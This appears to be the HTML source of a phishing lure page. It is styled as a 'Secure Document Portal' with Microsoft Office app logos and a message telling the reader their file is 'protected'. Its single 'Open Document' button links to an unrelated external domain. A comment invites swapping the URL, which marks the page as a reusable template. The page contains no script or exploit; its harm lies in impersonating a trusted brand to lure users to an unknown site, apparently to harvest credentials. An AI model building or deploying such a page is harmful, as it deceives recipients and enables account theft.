<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Secure Document Portal</title>
  <meta name="description" content="Open your encrypted document securely." />
  <style>
    *,*::before,*::after { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
      color: #0b1021;
      background: linear-gradient(180deg,#ffffff 0%, #f8fafc 100%);
      display: grid;
      place-items: center;
      padding: 24px;
    }
    .wrap {
      width: min(920px, 95vw);
      background: white;
      border: 1px solid #e5e7eb;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(2,6,23,.08);
      overflow: hidden;
    }
    .banner {
      position: relative;
      height: 200px;
      background: linear-gradient(135deg,#60a5fa,#1d4ed8);
    }
    .pattern { position:absolute; inset:0; }
    .banner h1 {
      position:absolute; bottom: 14px; left: 16px; right:16px;
      margin: 0; color: #1d4ed8; font-size: clamp(1.2rem, 2.2vw + .6rem, 1.6rem);
      background: white; display:inline-block; padding:6px 12px; border-radius:10px;
      border:1px solid rgba(29,78,216,.2);
      letter-spacing:.2px;
      box-shadow: 0 6px 18px rgba(2,6,23,.10);
    }
    .card {
      padding: 24px 20px 10px;
      display: grid;
      place-items: center;
      text-align: center;
      gap: 10px;
    }
    .envelope { width: 160px; height: 112px; position: relative; }
    .env-base {
      width: 100%; height: 100%; border-radius: 12px;
      background: #e9f0ff; border: 1px solid #c7d2fe; position: relative; overflow: hidden;
      box-shadow: 0 10px 32px rgba(29,78,216,.18);
    }
    .env-flap {
      position:absolute; top:0; left:0; right:0; height:56%;
      background: linear-gradient(180deg,#93c5fd,#2563eb);
      clip-path: polygon(0 0, 100% 0, 50% 100%);
      border-bottom: 1px solid #93c5fd;
    }
    .seal {
      position:absolute; top:44%; left:50%; transform: translate(-50%, -50%);
      width: 42px; height: 42px; border-radius: 999px; background: white; border:2px solid #2563eb;
      display:grid; place-items:center; font-weight:900; color:#1d4ed8;
      box-shadow: 0 6px 18px rgba(37,99,235,.18);
    }
    .badge {
      margin-top: 10px;
      display: inline-flex; align-items:center; gap:8px;
      padding: 8px 12px; border-radius: 999px; font-weight: 800; font-size:.9rem;
      background: #eef2ff; color:#1e293b; border: 1px solid #e5e7eb;
    }
    .lock { width: 16px; height: 16px; }
    .desc { margin: 6px 0 10px; color:#475569; font-size:.95rem }
    .cta {
      display:flex; justify-content:center; padding: 4px 20px 22px;
    }
    .btn {
      appearance:none; border:none; cursor:pointer;
      background: linear-gradient(135deg,#2563eb,#1d4ed8);
      color:white; font-weight: 900; letter-spacing:.2px;
      padding: 14px 18px; border-radius: 14px; font-size: 1rem;
      box-shadow: 0 16px 38px rgba(29,78,216,.28);
      transition: transform .2s, box-shadow .2s;
      text-decoration: none; display:inline-block;
    }
    .btn:hover { transform: translateY(-1px); box-shadow: 0 20px 44px rgba(29,78,216,.34); }
    .apps {
      display:flex; gap: 18px; justify-content:center; flex-wrap: wrap;
      padding: 18px 18px 26px; border-top: 1px solid #eef2ff; background: #fafbff;
    }
    .group { text-align:center }
    .app-label { font-size:.8rem; color:#475569; text-align:center; margin-top: 6px; }
    .logo-svg { width: 44px; height: 44px; display:block }
  </style>
</head>
<body>
  <main class="wrap" aria-label="Secure Document Portal">
    <section class="banner">
      <svg class="pattern" viewBox="0 0 1200 200" preserveAspectRatio="none" aria-hidden="true">
        <defs>
          <symbol id="cloud-shape" viewBox="0 0 120 60">
            <path fill="#fff" d="M28 42a14 14 0 1 1 4-28 19 19 0 0 1 36-2 13 13 0 1 1 5 25H28z"/>
          </symbol>
          <pattern id="puff" x="0" y="0" width="120" height="60" patternUnits="userSpaceOnUse">
            <use href="#cloud-shape" x="0" y="0" opacity=".9"/>
            <use href="#cloud-shape" x="60" y="-10" opacity=".8" transform="scale(0.9)"/>
          </pattern>
          <pattern id="puff2" x="0" y="0" width="180" height="90" patternUnits="userSpaceOnUse">
            <use href="#cloud-shape" x="20" y="10" opacity=".5" transform="scale(1.2)"/>
            <use href="#cloud-shape" x="100" y="0" opacity=".45" transform="scale(1.1)"/>
          </pattern>
        </defs>
        <rect width="1200" height="200" fill="url(#puff)"/>
        <rect width="1200" height="200" fill="url(#puff2)"/>
      </svg>
      <h1>Secure Cloud Delivery</h1>
    </section>

    <section class="card" aria-labelledby="doc-title">
      <div class="envelope" aria-hidden="true">
        <div class="env-base"></div>
        <div class="env-flap"></div>
        <div class="seal">✉︎</div>
      </div>
      <div class="badge" id="doc-title">
        <svg class="lock" viewBox="0 0 24 24" fill="none" stroke="#0b1021" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <rect x="3" y="11" width="18" height="10" rx="2" ry="2"></rect>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
        </svg>
        Document Encryption
      </div>
      <p class="desc">Your file is protected. Open securely to view the document.</p>
    </section>

    <div class="cta">
      <!-- Replace this URL anytime to point to a different document -->
      <a class="btn" href="https://brevixe.sa.com/t1yxbCLW/" target="_blank" rel="noopener">Open Document</a>
    </div>

    <section class="apps" aria-label="Compatible apps">
      <!-- Word -->
      <div class="group">
        <svg class="logo-svg" viewBox="0 0 48 48" aria-label="Word logo" role="img">
          <defs>
            <linearGradient id="w1" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0" stop-color="#2563eb"/><stop offset="1" stop-color="#1d4ed8"/>
            </linearGradient>
          </defs>
          <rect x="6" y="6" width="36" height="36" rx="8" fill="url(#w1)"/>
          <rect x="12" y="14" width="24" height="20" rx="3" fill="#fff" opacity=".14"/>
          <path d="M16 31l3-14h2l2.2 8.4L25.5 17h2l3 14h-2.2l-1.7-8.6-2.3 8.6h-1.8L20 22.3 18.5 31H16z" fill="#ffffff"/>
        </svg>
        <div class="app-label">Word</div>
      </div>

      <!-- Outlook -->
      <div class="group">
        <svg class="logo-svg" viewBox="0 0 48 48" aria-label="Outlook logo" role="img">
          <defs>
            <linearGradient id="o1" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0" stop-color="#3b82f6"/><stop offset="1" stop-color="#1d4ed8"/>
            </linearGradient>
          </defs>
          <rect x="6" y="6" width="36" height="36" rx="8" fill="url(#o1)"/>
          <rect x="12" y="14" width="18" height="20" rx="2" fill="#fff" opacity=".15"/>
          <circle cx="24" cy="24" r="8" fill="#fff"/>
          <circle cx="24" cy="24" r="4.5" fill="#1d4ed8"/>
        </svg>
        <div class="app-label">Outlook</div>
      </div>

      <!-- Excel -->
      <div class="group">
        <svg class="logo-svg" viewBox="0 0 48 48" aria-label="Excel logo" role="img">
          <defs>
            <linearGradient id="e1" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0" stop-color="#10b981"/><stop offset="1" stop-color="#047857"/>
            </linearGradient>
          </defs>
          <rect x="6" y="6" width="36" height="36" rx="8" fill="url(#e1)"/>
          <rect x="16" y="14" width="18" height="20" rx="2" fill="#fff" opacity=".18"/>
          <path d="M18 18l6 6-6 6m6-6l6 6m-6-6l6-6" stroke="#ffffff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <div class="app-label">Excel</div>
      </div>

      <!-- OneNote -->
      <div class="group">
        <svg class="logo-svg" viewBox="0 0 48 48" aria-label="OneNote logo" role="img">
          <defs>
            <linearGradient id="n1" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0" stop-color="#a855f7"/><stop offset="1" stop-color="#7c3aed"/>
            </linearGradient>
          </defs>
          <rect x="6" y="6" width="36" height="36" rx="8" fill="url(#n1)"/>
          <rect x="14" y="14" width="20" height="20" rx="3" fill="#fff" opacity=".16"/>
          <path d="M18 30V18l12 12V18" stroke="#ffffff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <div class="app-label">OneNote</div>
      </div>

      <!-- PowerPoint -->
      <div class="group">
        <svg class="logo-svg" viewBox="0 0 48 48" aria-label="PowerPoint logo" role="img">
          <defs>
            <linearGradient id="p1" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#dc2626"/>
            </linearGradient>
          </defs>
          <rect x="6" y="6" width="36" height="36" rx="8" fill="url(#p1)"/>
          <circle cx="24" cy="24" r="9" fill="#fff" opacity=".2"/>
          <path d="M21 18h5.5a3.5 3.5 0 1 1 0 7H21V18z" fill="#ffffff"/>
        </svg>
        <div class="app-label">PowerPoint</div>
      </div>
    </section>
  </main>
</body>
</html>
